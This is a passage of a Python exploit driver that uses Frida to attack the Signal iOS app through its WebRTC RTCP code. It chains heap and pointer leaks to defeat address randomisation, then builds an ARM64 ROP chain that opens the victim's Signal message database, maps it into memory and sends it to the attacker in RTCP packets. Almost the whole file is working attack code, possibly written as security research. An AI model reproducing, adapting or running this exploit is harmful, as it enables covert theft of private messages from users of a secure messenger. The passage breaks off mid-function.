#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import binascii
from copy import deepcopy
import frida
import json
from offset_finding import SystemOffsetFinder, SignalOffsetFinder, SignalOffsets
from rgadget import Gadget
import signal
import sys
import time
import typing
from utils import log


class ExploitDriver:
    """
    ExploitDriver class responsible for invoking Frida, leaking addresses and
    constructing the final payload
    """

    def __init__(self, script: str, debug: bool = False,
                 gadgets: str = None, cache: str = None, device: str = None,
                 signal: str = None, target_e164: str = None):

        # From the modified and compiled Signal app, overwritten if a Signal IPA is specified in run
        self.offsets_signal: typing.Optional[SignalOffsets] = SignalOffsets(0x100c27978, 0x100b6cba8,
                                                                            0x0002f3fcc, 0x00104aef0,
                                                                            0x0004d9e18, 0x0004a2c68,
                                                                            0x00021dee0)
        self._NXArgv = None
        self._opennocancel_offset = None
        self._UIApp_offset = None
        self.gadgets = None
        self.NSString_offset = None
        self._NXArgv_offset = None
        self._mmap_offset = None
        self._mmap = None
        self._opennocancel = None
        self.pivot_len = None
        self.done = False
        # Frida script
        self.script = script
        # Frida session
        self.session = None
        # Debug setting. If true, will log debug output to console
        self.debug = debug
        # Frida device name. If no device, will default to first USB cxn
        self.device = device
        # Payload bytes to send when hijacking rip
        self.payload = None
        # Target phone number
        self.target_e164 = target_e164
        # Base WebRTC library address
        self.webrtc_base = None
        # Shared cache which will be extracted for gadgets
        self.cache = cache
        # UIKitCore data address used to leak UIApp pointer on heap
        self._UIApp = None
        # UIApplicationDelgate address used to leak ISA pointer to Signal.AppDelegate
        self.UIApplicationDelegate = None
        # base address of Signal MachO
        self.Signal = None
        # base address of SignalServiceKit MachO
        self.SSK = None
        # pointer in memory to signal.sqlite database path
        self.database_path_ptr = None

        # GET GADGETS
        # Path to ROP gadgets with stack offset and cache address
        self.gadget_json = gadgets
        log("Parsing shared cache gadgets and offsets")
        self.get_offsets_and_gadgets()
        log("Finished parsing shared cache gadgets and offsets")

        # GET SIGNAL OFFSETS
        self.signal_path = signal
        log("Parsing Signal, SignalServiceKit, and WebRTC offsets")
        self.get_signal_offsets()
        log("Finish parsing Signal, SignalServiceKit, and WebRTC offsets")

        # SETUP LEAK CHAIN
        # MediaChannelUtil::TransportForMediaChannels Class Address
        self.transport = None
        # NXArgv address and worker_thread stack target address
        self.NXArgv = None
        self.argv_stack = None
        self.possible_pushed_lrs = list()
        self.stack_offset = 0x011bb5e0
        self.worker_thread_stack = None
        # Shared cache base
        self.cache_slide = None
        # Current leak target
        self.target = None
        # List of targets to leak, in order
        # Includes the parent pointer address if dependent on another leak
        self.targets: typing.Dict[str, typing.Dict[str, typing.Optional[int, None, str]]] = {
            "RTCPReceiver": {"ptr": 0x4141, "next": "RealTimeClock"},
            "RealTimeClock": {"ptr": None, "next": "RealTimeClock_vtable"},
            "RealTimeClock_vtable": {"ptr": None, "next": "rtp_rtcp_"},
            "rtp_rtcp_": {"ptr": None, "next": "transport_"},
            "transport_": {"ptr": None, "next": "transport_vtable"},
            "transport_vtable": {"ptr": None, "next": "transport_sendrtcp"},
            "transport_sendrtcp": {"ptr": None, "next": "NSString"},
            "NSString": {"ptr": None, "next": "_NXArgv"},
            "_NXArgv": {"ptr": None, "next": "PushedLR"},
            "PushedLR": {"ptr": None, "next": "_UIApp"},
            "_UIApp": {"ptr": None, "next": "UIApplicationDelegate"},
            "UIApplicationDelegate": {"ptr": None, "next": "UIApplicationDelegateISA"},
            "UIApplicationDelegateISA": {"ptr": None, "next": "UIApplicationDelegate_Metaclass"},
            "UIApplicationDelegate_Metaclass": {"ptr": None, "next": "SSK_SSKEnvironment_meta"},
            "SSK_SSKEnvironment_meta": {"ptr": None, "next": "SSKEnvironment"},
            "SSKEnvironment": {"ptr": None, "next": "databaseStorage"},
            "databaseStorage": {"ptr": None, "next": "DatabaseURL"},
            "DatabaseURL": {"ptr": None, "next": "DatabaseNSString"},
            "DatabaseNSString": {"ptr": None, "next": "DatabaseChars"},
            "DatabaseChars": {"ptr": None, "next": None},
        }
        self.target = "RTCPReceiver"
        # Leaked objects for payload
        self.objects = {}
        # Leaked object queries to avoid replaying based on latency
        self.object_queries = {}

    def cleanup(self):
        """
        Detach from Frida and clean up process so the ExploitDriver can return
        """
        if self.device and self.session:
            self.device.kill(self.pid)
            self.session.detach()
            self.device = None
            self.session = None
        self.done = True

    def get_signal_offsets(self):
        """
        Get Signal offsets using paths to .ipa file
        """
        if self.signal_path:
            log("Extracting Signal.ipa")

            offsets_signal = SignalOffsetFinder(self.signal_path)

            offsets_signal.find_offsets()

            self.offsets_signal = offsets_signal.offsets

        if self.debug:
            log("Got Signal.AppDelegate offset: " + hex(self.offsets_signal.AppDelegateOffset), "debug")
            log("Got Signal SSKEnvironment meta offset: " + hex(self.offsets_signal.SSKEnvironmentMeta),
                "debug")
            log("Got SSK SSKEnvironment meta offset: " + hex(self.offsets_signal.ServiceSSKEnvironmentMeta),
                "debug")
            log("Got SSKEnvironment offset: " + hex(self.offsets_signal.ServiceEnvironment), "debug")
            log("Got WebRTC __objc_classrefs offset: " + hex(self.offsets_signal.ObjcClassrefsOffset), "debug")
            log("Got WebRTC RealTimeClock vtable offset: " + hex(self.offsets_signal.RealTimeClockVtableOffset), "debug")
            log("Got WebRTC IncomingPacket pushed lr offset: " + hex(self.offsets_signal.IncomingPacketReturn), "debug")

    def get_offsets_and_gadgets(self):
        """
        Get gadget offsets using paths to shared libraries and shared cache
        """
        finder = SystemOffsetFinder(self.cache)
        finder.find_offsets()

        (self.NSString_offset, self._NXArgv_offset, self._opennocancel_offset, self._mmap_offset,
         self._UIApp_offset) = (finder.offsets.NSString, finder.offsets.NXArgv,
                                finder.offsets.opennocancel, finder.offsets.mmap, finder.offsets.UIApp)

        # Get gadgets
        self.gadgets = dict()
        log("Parsing gadget JSON file", "debug")
        try:
            j = json.loads(open(self.gadget_json, "r").read())
            for k, v in j.items():
                self.gadgets[k] = v
        except Exception as e:
            log("Received exception " + str(e) + " parsing gadget JSON file", "err")
            self.cleanup()

        if self.debug:
            log("Got NSString offset: " + hex(self.NSString_offset), "debug")
            log("Got _NXArgv offset: " + hex(self._NXArgv_offset), "debug")
            log("Got _opennocancel offset: " + hex(self._opennocancel_offset), "debug")
            log("Got _mmap offset: " + hex(self._mmap_offset), "debug")
            log("Got _UIApp offset: " + hex(self._UIApp_offset), "debug")

    def generate_payload(self):
        """
        Generate the ROP payload to send for hijacking execution and leaking database
        """
        def store_x_from_stack_into_y_on_heap(x, y):
            retval = list()

            # load ROPBUF from stack, store in scratch space
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"] = {}
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"]["x19"] = \
                PUSHED_LR + ROPBUF
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"]["x20"] = \
                PUSHED_LR + ROPBUF_TEMP
            retval.append(deepcopy(self.gadgets["ldr x8,[x19];str x8,[x20]"]))

            # add requested offset to ROPBUF, store in scratch space
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"] = {}
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"]["x19"] = y
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"]["x20"] = \
                PUSHED_LR + ROPBUF_TEMP
            retval.append(deepcopy(self.gadgets["add x8,x8,x19; str x8,[x20]"]))

            # load stack value using offset to write
            self.gadgets["mov x0,x19"]["vals"] = {}
            self.gadgets["mov x0,x19"]["vals"]["x19"] = \
                PUSHED_LR + x
            retval.append(deepcopy(self.gadgets["mov x0,x19"]))

            # store requested stack address onto heap buffer
            self.gadgets["str x0,[x8]"]["vals"] = {}
            retval.append(deepcopy(self.gadgets["str x0,[x8]"]))

            return retval

        def store_x_into_y_both_on_heap(x, y):
            # must have x19 and x20 control in prior gadget
            retval = list()

            # load ROPBUF starting address (store in temp addr)
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"] = {}
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"]["x19"] = \
                PUSHED_LR + ROPBUF
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"]["x20"] = \
                PUSHED_LR + ROPBUF_TEMP
            retval.append(deepcopy(self.gadgets["ldr x8,[x19];str x8,[x20]"]))

            # add ROPBUF offset (store in temp addr)
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"] = {}
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"]["x19"] = y
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"]["x20"] = \
                PUSHED_LR + ROPBUF_TEMP
            retval.append(deepcopy(self.gadgets["add x8,x8,x19; str x8,[x20]"]))

            # load ROPBUF starting address into x0
            self.gadgets["ldp x0,x1 [x19]"]["vals"] = {}
            self.gadgets["ldp x0,x1 [x19]"]["vals"]["x19"] = PUSHED_LR + ROPBUF
            retval.append(deepcopy(self.gadgets["ldp x0,x1 [x19]"]))

            # add ROPBUF offset
            self.gadgets["add x0,x0,x19"]["vals"] = {}
            self.gadgets["add x0,x0,x19"]["vals"]["x19"] = x
            retval.append(deepcopy(self.gadgets["add x0,x0,x19"]))

            # str x, [y]
            self.gadgets["str x0,[x8]"]["vals"] = {}
            retval.append(deepcopy(self.gadgets["str x0,[x8]"]))

            return retval

        def load_add_store_from_stack_to_stack(load_off, store_off, increment):
            # must have x19 and x20 control in prior gadget
            retval = list()

            # load value from stack using load offset, store temporarily
            # in destination
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"] = {}
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"]["x19"] = \
                PUSHED_LR + load_off
            self.gadgets["ldr x8,[x19];str x8,[x20]"]["vals"]["x20"] = \
                PUSHED_LR + store_off
            retval.append(deepcopy(self.gadgets["ldr x8,[x19];str x8,[x20]"]))

            # add by requested value and store in destination offset on stack
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"] = {}
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"]["x19"] = \
                increment
            self.gadgets["add x8,x8,x19; str x8,[x20]"]["vals"]["x20"] = \
                PUSHED_LR + store_off
            retval.append(deepcopy(self.gadgets["add x8,x8,x19; str x8,[x20]"]))

            return retval

        def cmp_x0_x19_csel_eq(x19, val_if_neq, val_if_eq):
            # must have x19 control in prior gadget
            self.gadgets["cmp x0,x19; cset w0 eq"]["vals"] = {}
            self.gadgets["cmp x0,x19; cset w0 eq"]["vals"]["x19"] = x19
            full_chain.append(deepcopy(self.gadgets["cmp x0,x19; cset w0 eq"]))

            # load values for the equal and not equal cases
            self.gadgets["mov x8,x20"]["vals"] = {}
            # make x19 == x20 to pass a gadget loop check
            self.gadgets["mov x8,x20"]["vals"]["x19"] = val_if_eq
            self.gadgets["mov x8,x20"]["vals"]["x20"] = val_if_eq
            full_chain.append(deepcopy(self.gadgets["mov x8,x20"]))

            self.gadgets["mov x9,x19"]["vals"] = {}
            self.gadgets["mov x9,x19"]["vals"]["x19"] = val_if_neq
            full_chain.append(deepcopy(self.gadgets["mov x9,x19"]))
            # choose value for x0 based on prior condition
            full_chain.append(deepcopy(self.gadgets["cmp w0,#0; csel x0,x9,x8 eq"]))

        """
        Assemble payload including pivoting ROP chain and full ROP chain. Part a
        is copied to the stack using the arbitrary write primtive while the full
        payload (Parts b-i) are executed in-place after the pivot.

        Part a - pivot sp to packet (heap) buffer and store buf on stack
         * store payload buffer starting address (heap) from x21 to known address for safe keeping
         * calculate offset in payload to full ROP chain and clobber next x29
         * `sub sp, x29, #0x10` gadget to move sp to the full ROP chain on heap

        Part b - store transport on stack
         * store leaked `MediaChannelUtil::TransportForMediaChannels` address for later

        Part c - open database and map in data
         * load leaked database path pointer and open O_RDONLY
         * use returned fd to mmap data to new pages in memory

        Part d - store buffer and counter on the stack
         * store returned data pointer to stack for later
         * store counter (initialized to 0) to stack for later

        Part e - jump to Part g (skip increment)
         * calculate offset in payload to part g and clobber next x29
         * `sub sp, x29, #0x10` gadget to move sp to part g

        Part f - increment counter and advance buffer
         * load counter, add one, and re-store
         * load existing database pointer, add 1984 bytes, and re-store

        Part g - compare counter and set call/retab gadget
         * load counter and compare to limit
         * if less than limit, load address to `SendRtcp` function
         * if equal to limit, load address to a `retab` instruction
         * store loaded address onto scratch space on stack for part h

        Part h - store return fp and lr after rtcp call on stack
         * load address of future x29, x30 on stack for return from `SendRtcp`
         * calculate address of part f gadgets in payload
         * store future x29, x30 at return from `SendRtcp` to pivot stack to part f

        Part i - pivot stack and jump to call/retab
         * load leaked transport and current data pointer into x0, x1
         * load length of packet (1984) into x2
         * calculate stack landing for call/retab and clobber next x29
         * `sub sp, x29, #0x10` to pivot stack and call `SendRtcp` or infinite `retab`

        Once the call returns, the modifications by Part h will pivot the stack
        back to part f to loop until the counter reaches its limit

        """

        '''
        Each `Gadget` represents a generic stack frame as shown below, though
        the number and layout of loaded registers is configurable.

              |------------8 bytes-----------||------------8 bytes-----------|
       sp-+>  `------------------------------..------------------------------'
          |   |              ...             ||              ...             |
          |   `------------------------------::------------------------------'
          |   |              x21             ||              x22             |
          |   `------------------------------::------------------------------'
       offset |              x20             ||              x19             |
          |   `------------------------------::------------------------------'
          |   |              fp              ||              lr              |
          L   `------------------------------''------------------------------'

        The chain is a list of `Gadget`s that includes the gadget (with address
        and offset), register offsets, and optional register values. Register
        values are for the next gadget and are written if included.
        '''

        # constant offsets on stack
        PUSHED_LR = self.worker_thread_stack
        RTCP_CALL = 0x200
        RTCP_RET = RTCP_CALL + 0xe0
        TRANSPORT = 0x418
        DBBUF = 0x420
        CTR = 0x428
        ROPBUF = 0x430
        ROPBUF_TEMP = 0x438

        ''' generate gadgets for system calls '''
        self.gadgets["call opennocancel"] = {
            # jump to internal call for __open
            "addr": self._opennocancel + 0x24,
            "offset": 0x20,
            "regs": {"x29": -2, "x30": -1}
        }
        self.gadgets["call mmap"] = {
            # call__mmap
            "addr": self._mmap + 0x38,
            "offset": 0x30,
            "regs": {
                "x29": -2,
                "x30": -1,
                "x20": -4,
                "x19": -3,
                "x22": -6,
                "x21": -5,
            },
            "clobbers": ["x20", "x8"]
        }
        self.gadgets["call transport_sendrtcp"] = {
            # jump to after stack drop
            "addr": self.objects["transport_sendrtcp"]["addr"] + 0x10,
            "offset": 0xb0,
            "regs": {"x30": -1}
        }

        ''' Part a - pivot sp to packet (heap) buffer and store buf on stack '''
        payload = b""

        pivot_chain = list()
        # mov packet buffer to x1, then x0 and add to offset to main ROP chain
        # store heap buffer (x21) onto the stack
        payload += self.gadgets["mov x0,x21"]["addr"].to_bytes(8, "little")
        pivot_chain.append(deepcopy(self.gadgets["mov x0,x21"]))
        self.gadgets["stp x0,x1 [x19]"]["vals"] = {}
        self.gadgets["stp x0,x1 [x19]"]["vals"]["x19"] = PUSHED_LR + ROPBUF
        pivot_chain.append(deepcopy(self.gadgets["stp x0,x1 [x19]"]))
        self.gadgets["add x0,x0,x19"]["vals"] = {}
        self.gadgets["add x0,x0,x19"]["vals"]["x19"] = 0x0a0a0a0a0a0a0a0a
        pivot_chain.append(deepcopy(self.gadgets["add x0,x0,x19"]))
        pivot_chain.append(deepcopy(self.gadgets["str x0,x19,#0x18"]))
        # calculate offset to override x29 before sub sp, x29 gadget
        offset = 0
        for g in pivot_chain:
            offset += g["offset"]
        offset -= 0x18

        # overwrite last gadget to include the target address - 0x18 in x19
        self.gadgets["str x0,x19,#0x18"]["vals"] = {}
        self.gadgets["str x0,x19,#0x18"]["vals"]["x19"] = PUSHED_LR + offset
        pivot_chain[-1] = deepcopy(self.gadgets["str x0,x19,#0x18"])
        self.gadgets["str x0,x19,#0x18"]["vals"] = {}

        # set x22 value for future mov into x1
        self.gadgets["sub sp,x29,#0x10"]["vals"] = {}
        self.gadgets["sub sp,x29,#0x10"]["vals"]["x22"] = 0x60000
        pivot_chain.append(deepcopy(self.gadgets["sub sp,x29,#0x10"]))
        self.gadgets["sub sp,x29,#0x10"]["vals"] = {}

        offset = 0
        for i in range(0, len(pivot_chain)):
            offset += pivot_chain[i]["offset"]
            if i != len(pivot_chain) - 1:
                nxt = pivot_chain[i + 1]
            else:
                nxt = None
            payload += Gadget(pivot_chain[i], nxt).generate()

        # strip trailing 0s since the stack pivots after the sub rsp gadget
        payload = payload.rstrip(b"\x00")
        # repad with 0s for little endianness
        payload += b'\x00' * (0x10 - (len(payload) % 0x10))

        # replace poison placeholder with actual offset of full ROP chain start
        self.pivot_len = len(payload)
        full_chain_start = self.pivot_len + 0x10  # 0x10 for packet header
        payload = payload.replace(b'\x0a' * 8,
                                  (full_chain_start + 0x10).to_bytes(8, "little"))

        # pad payload and put x20, x19 values destined for next gadget in place
        # subtract 0x10 bytes for math in previous gadget and +0x8 for addr at
        # the front of the payload + padding to make sp aligned
        payload += 0x0.to_bytes(8, "little")  # x20
        payload += self.transport.to_bytes(8, "little")  # x19
        payload += 0x0.to_bytes(8, "little")  # fp
        payload += (self.gadgets["mov x0,x19"]["addr"]).to_bytes(8, "little")

        ''' Part b - store transport on stack '''
        full_chain = list()

        # store transport on stack for later
        full_chain.append(deepcopy(self.gadgets["mov x0,x19"]))

        self.gadgets["stp x0,x1 [x19]"]["vals"] = {}
        self.gadgets["stp x0,x1 [x19]"]["vals"]["x19"] = PUSHED_LR + TRANSPORT
        full_chain.append(deepcopy(self.gadgets["stp x0,x1 [x19]"]))

        ''' Part c - open database and map in data '''
        # fd = open(scratch_buf, 0)
        self.gadgets["mov x0,x19"]["vals"] = {}
        self.gadgets["mov x0,x19"]["vals"]["x19"] = self.database_path_ptr
        full_chain.append(deepcopy(self.gadgets["mov x0,x19"]))

        # mov future mmap x19, x20 values for x2, x3 because opennocancel does
        # not set them
        self.gadgets["mov x1,#0"]["vals"] = {}
        self.gadgets["mov x1,#0"]["vals"]["x19"] = 0x3
        self.gadgets["mov x1,#0"]["vals"]["x20"] = 0x0
        full_chain.append(deepcopy(self.gadgets["mov x1,#0"]))
        self.gadgets["mov x1,#0"]["vals"] = {}
        full_chain.append(deepcopy(self.gadgets["call opennocancel"]))

        # mmap(X, 0x60000, 0x3 (PROT_READ|PROT_WRITE), MAP_FD, fd, 0)
        # store returned buffer at beginning of payload
        full_chain.append(deepcopy(self.gadgets["mov x4,x0"]))
        full_chain.append(deepcopy(self.gadgets["mov x1,x22; mov x2,x19; mov x3,x20"]))
        full_chain.append(deepcopy(self.gadgets["mov x5,#0; ldr x6,[sp, #0x8]; blraaz x6"]))

        self.gadgets["call mmap"]["vals"] = {}
        full_chain.append(deepcopy(self.gadgets["call mmap"]))

        ''' Part d - store buffer and counter on the stack '''
        self.gadgets["mov x1,#0"]["vals"] = {}
        # add in 0x10 bytes to the prior frame and remove after assembling chain
        # the blraaz gadget does not move the stack 0x10 bytes so this adjusts
        self.gadgets["mov x1,#0"]["vals"]["x21"] = 0x0404040404040404
        self.gadgets["mov x1,#0"]["vals"]["x22"] = 0x0404040404040404
        # set x19 here because this gadget does not
        self.gadgets["mov x1,#0"]["vals"]["x19"] = PUSHED_LR + DBBUF
        full_chain.append(deepcopy(self.gadgets["mov x1,#0"]))
        self.gadgets["mov x1,#0"]["vals"] = {}

        self.gadgets["stp x0,x1 [x19]"]["vals"] = {}
        full_chain.append(deepcopy(self.gadgets["stp x0,x1 [x19]"]))

        ''' Part e - jump to Part g (skip increment) '''
        full_chain.extend(store_x_into_y_both_on_heap(0x0202020202020202,
                                                      0x0303030303030303))

        full_chain.append(deepcopy(self.gadgets["sub sp,x29,#0x10"]))

        part_e_offset = 0
        for g in full_chain:
            part_e_offset += g["offset"]

        ''' Part f - increment counter and advance buffer '''
        # load ctr and update
        full_chain.extend(load_add_store_from_stack_to_stack(CTR, CTR, 1))
        # advance buffer and store update on stack
        full_chain.extend(load_add_store_from_stack_to_stack(DBBUF, DBBUF, 1984))

        part_f_offset = 0
        for g in full_chain:
            part_f_offset += g["offset"]

        ''' Part g - compare counter and set call/retab gadget '''
        # compare buf ctr
        self.gadgets["ldp x0,x1 [x19]"]["vals"] = {}
        self.gadgets["ldp x0,x1 [x19]"]["vals"]["x19"] = PUSHED_LR + CTR
        full_chain.append(deepcopy(self.gadgets["ldp x0,x1 [x19]"]))

        cmp_x0_x19_csel_eq(0x60000 // 1984,
                           self.gadgets["call transport_sendrtcp"]["addr"],
                           self.gadgets["retab"]["addr"])

        # store chosen gadget to the call RTCP stack address
        self.gadgets["stp x0,x1 [x19]"]["vals"] = {}
        self.gadgets["stp x0,x1 [x19]"]["vals"]["x19"] = (self.worker_thread_stack +
                                                          RTCP_CALL + 8)  # add 8 because addr is in x0
        full_chain.append(deepcopy(self.gadgets["stp x0,x1 [x19]"]))

        ''' Part h - store return fp and lr after rtcp call on stack '''
        # get ROP buffer target address to pivot back to - Part f (increment)
        full_chain.extend(load_add_store_from_stack_to_stack(ROPBUF, ROPBUF_TEMP, 0x0101010101010101))

        # load stored offset into x0 and sub sp gadget into x1
        self.gadgets["ldp x0,x1 [x19]"]["vals"] = {}
        self.gadgets["ldp x0,x1 [x19]"]["vals"]["x19"] = PUSHED_LR + ROPBUF_TEMP
        full_chain.append(deepcopy(self.gadgets["ldp x0,x1 [x19]"]))

        self.gadgets["mov x1,x19;ldp x20,x19"]["vals"] = {}
        self.gadgets["mov x1,x19;ldp x20,x19"]["vals"]["x19"] = \
            self.gadgets["sub sp,x29,#0x10"]["addr"]
        full_chain.append(deepcopy(self.gadgets["mov x1,x19;ldp x20,x19"]))

        # store pair on stack at end of call
        self.gadgets["stp x0,x1 [x19]"]["vals"] = {}
        self.gadgets["stp x0,x1 [x19]"]["vals"]["x19"] = PUSHED_LR + RTCP_RET
        full_chain.append(deepcopy(self.gadgets["stp x0,x1 [x19]"]))

        ''' Part i - pivot stack and jump to call/retab '''
        # load ROPBUF and calculate the destination address (end of this frame)
        full_chain.extend(
            store_x_from_stack_into_y_on_heap(RTCP_CALL,
                                              0x0505050505050505))

        # load registers for call
        self.gadgets["ldp x0,x1 [x19]"]["vals"] = {}
        self.gadgets["ldp x0,x1 [x19]"]["vals"]["x19"] = PUSHED_LR + TRANSPORT
        full_chain.append(deepcopy(self.gadgets["ldp x0,x1 [x19]"]))

        self.gadgets["mov x2,x19"]["vals"] = {}
        self.gadgets["mov x2,x19"]["vals"]["x19"] = 1984
        full_chain.append(deepcopy(self.gadgets["mov x2,x19"]))

        full_chain.append(deepcopy(self.gadgets["sub sp,x29,#0x10"]))

        offset = 0
        for i in range(0, len(full_chain)):
            offset += full_chain[i]["offset"]
            if i != len(full_chain) - 1:
                nxt = full_chain[i + 1]
            else:
                nxt = None
            payload += Gadget(full_chain[i], nxt).generate()

        # find and replace poisoned values
        payload = payload.replace(b'\x01' * 8, (part_e_offset + full_chain_start).to_bytes(8, "little"))
        payload = payload.replace(b'\x02' * 8, (part_f_offset + full_chain_start).to_bytes(8, "little"))
        # subtract length of sub sp gadget from this offset
        payload = payload.replace(b'\x03' * 8, (part_e_offset + full_chain_start - 0x20).to_bytes(8, "little"))
        # subtract length of sub sp gadget from this offset
        payload = payload.replace(b'\x05' * 8, (offset + full_chain_start - 0x20).to_bytes(8, "little"))
        # remove 10 bytes after blraaz x8 gadget since there is no stack shift
        payload = payload.replace(b'\x04' * 16, b'')

        self.payload = payload

    def calc_cache_slide(self, leak):
        """
        Calculate cache base (slide) given leak
        :param leak Leaked (slid) address
        """
        self.cache_slide = leak - self.NSString_offset
        # calculate addresses for functions given slide and offset
        # 20E247__iPhone15,2 dynamically calculated
        self._NXArgv = self._NXArgv_offset + self.cache_slide
        self._opennocancel = self.cache_slide + self._opennocancel_offset
        self._mmap = self.cache_slide + self._mmap_offset
        self.targets["_UIApp"]["ptr"] = self.cache_slide + self._UIApp_offset

        # calculate addresses for gadgets given slide and offsets
        for key, value in self.gadgets.items():
            value["addr"] = value["addr"] + self.cache_slide
            self.gadgets[key] = value
        if self.debug:
            log("Found cache slide: " + hex(self.cache_slide), "debug")
            log("Found _mmap: " + hex(self._mmap), "debug")
            log("Found _NXArgv: " + hex(self._NXArgv), "debug")
            log("Found _UIApp: " + hex(self.targets["_UIApp"]["ptr"]), "debug")
            log("Found _opennocancel: " + hex(self._opennocancel), "debug")
            log("Found gadgets: ", "debug")
            log(json.dumps(self.gadgets, indent=2), "debug")

    def handle_leak(self, target: str, addr: int) -> bool:
        """
        Update leaked addresses and targets
        """
        # leaks address of RTCPReceiver and RealTimeClock object on heap
        if target == "RTCPReceiver":
            self.targets["RealTimeClock"]["ptr"] = addr
            self.targets["rtp_rtcp_"]["ptr"] = addr + 0x10
        # Leaks address of `vtable for webrtc::RealTimeClock`
        elif target == "RealTimeClock":
            self.targets["RealTimeClock_vtable"]["ptr"] = addr
        # leaks WebRTC base address
        elif target == "RealTimeClock_vtable":
            # subtract 0x10 because function leaked is 0x10 into vtable
            self.webrtc_base = addr - self.offsets_signal.RealTimeClockVtableOffset - 0x10
            assert self.webrtc_base & ~0xfff == self.webrtc_base, \
                "Error, calculated WebRTC base of " + hex(self.webrtc_base) + " is not aligned"
            self.targets["NSString"]["ptr"] = self.webrtc_base + self.offsets_signal.ObjcClassrefsOffset
            log("Found WebRTC base: " + hex(self.webrtc_base))
        # leaks address of ModuleRtpRtcp object on heap
        elif target == "rtp_rtcp_":
            self.targets["transport_"]["ptr"] = addr + 0x48
        # leaks address of MediaChannelUtil::TransportForMediaChannels object
        elif target == "transport_":
            self.transport = addr
            self.targets["transport_vtable"]["ptr"] = addr
        # leaks address of MediaChannelUtil::TransportForMediaChannels vtable
        elif target == "transport_vtable":
            self.targets["transport_sendrtcp"]["ptr"] = addr + 0x8
        # leaks address of NSString class in Foundation library
        elif target == "NSString":
            self.calc_cache_slide(addr)
            self.targets["_NXArgv"]["ptr"] = self._NXArgv
        # Leaks address of stack stored in _NXArgv global in Foundation
        elif target == "_NXArgv":
            self.argv_stack = addr
            log("Leaked stack address: " + hex(addr), "debug")
            self.targets["PushedLR"]["ptr"] = addr + self.stack_offset + 0x38
            self.possible_pushed_lrs.append(addr + self.stack_offset + 0x50)
            self.possible_pushed_lrs.append(addr + self.stack_offset + 0x8c000 + 0x38)
            self.possible_pushed_lrs.append(addr + self.stack_offset + 0x8c000 + 0x50)
            self.possible_pushed_lrs.append(addr + self.stack_offset - 0x8c000 + 0x38)
            self.possible_pushed_lrs.append(addr + self.stack_offset - 0x8c000 + 0x50)
        elif target == "PushedLR":
            if addr == self.offsets_signal.IncomingPacketReturn + self.webrtc_base:
                self.worker_thread_stack = self.targets["PushedLR"]["ptr"] - 0x48
                log("Leaked worker_thread stack target return: " + hex(self.worker_thread_stack), "debug")
            else:
                log("Did not match expected pushed lr at " + hex(self.targets["PushedLR"]["ptr"]), "debug")
                del self.objects["PushedLR"]
                ptr = self.possible_pushed_lrs.pop(0)
                if ptr is None:
                    log("Could not find the worker_thread stack", "err")
                    self.done = True
                self.targets["PushedLR"]["ptr"] = ptr
                return False
        elif target == "_UIApp":
            self.targets["UIApplicationDelegate"]["ptr"] = addr + 0x10
            log("Leaked global UIApplication instance: " + hex(addr), "debug")
        elif target == "UIApplicationDelegate":
            self.targets["UIApplicationDelegateISA"]["ptr"] = addr
            log("Leaked UIApplication instance: " + hex(addr), "debug")
        elif target == "UIApplicationDelegateISA":
            self.targets["UIApplicationDelegate_Metaclass"]["ptr"] = addr & 0x0000000ffffffff8
        elif target == "UIApplicationDelegate_Metaclass":
            self.Signal = addr - self.offsets_signal.AppDelegateOffset
            assert self.Signal & ~0xfff == self.Signal, "Signal base address not aligned"
            self.targets["SSK_SSKEnvironment_meta"]["ptr"] = self.Signal + self.offsets_signal.SSKEnvironmentMeta
            log("Leaked Signal base address: " + hex(self.Signal), "debug")
        elif target == "SSK_SSKEnvironment_meta":
            self.SSK = addr - self.offsets_signal.ServiceSSKEnvironmentMeta
            assert self.SSK & ~0xfff == self.SSK, "SignalServiceKit base address not aligned"
            self.targets["SSKEnvironment"]["ptr"] = self.SSK + self.offsets_signal.ServiceEnvironment
            log("Leaked SSK base address: " + hex(self.SSK), "debug")
        elif target == "SSKEnvironment":
            # add offset of databaseStorage pointer in SSKEnvironment class
            self.targets["databaseStorage"]["ptr"] = addr + 0x128
            log("Leaked SSKEnvironment instance: " + hex(addr), "debug")
        elif target == "databaseStorage":
            # add offset of NSURL in SDSDatabaseStorage class
            self.targets["DatabaseURL"]["ptr"] = addr + 0x20
            log("Leaked databaseStorage global instance: " + hex(addr), "debug")
        elif target == "DatabaseURL":
            # add offset of NSString in NSURL
            self.targets["DatabaseNSString"]["ptr"] = addr + 0x18
            log("Leaked database URL: " + hex(addr), "debug")
        elif target == "DatabaseNSString":
            self.targets["DatabaseChars"]["ptr"] = addr + 0x11
            log("Leaked database NSString: " + hex(addr), "debug")
            # add 7 bytes to skip "file://"
            log("Leaked database path pointer: " + hex(addr + 0x18), "debug")
            self.database_path_ptr = addr + 0x18
        elif target == "DatabaseChars":
            log("Leaked database chars: " + hex(addr), "debug")
            # check the file bytes start with file:///
            assert addr == 0x2f2f2f3a656c6966, "Leaked file path does not match expected bytes"
        return True

    def on_message(self, message, data):
        """
        Frida onMessage handler for routing message and data to appropriate Driver handlers
        """
        if message["type"] == "error":
            if "description" in message and \
                    message["description"] == "Exiting Frida JS script":
                level = ""
            else:
                level = "err"
            log(message["description"], level)
            self.cleanup()
        elif "key" in message["payload"]:
            key = message["payload"]["key"]
            if key == "debug":
                log(message["payload"]["function"] + '\n' +
                    message["payload"]["data"].replace("\\n", "\n"), "debug")
            elif key == "LeakedDB":
                self.assemble_db(data)
            elif key == "LeakRequest":
                self.send_leak_message()
            elif key == "PayloadRequest":
                self.send_payload()
            elif key == "LeakedAddr":
                # save into the expected variable using the lower 32 bits
                lower = int(message["payload"]["lower32"])
                if lower in self.object_queries:
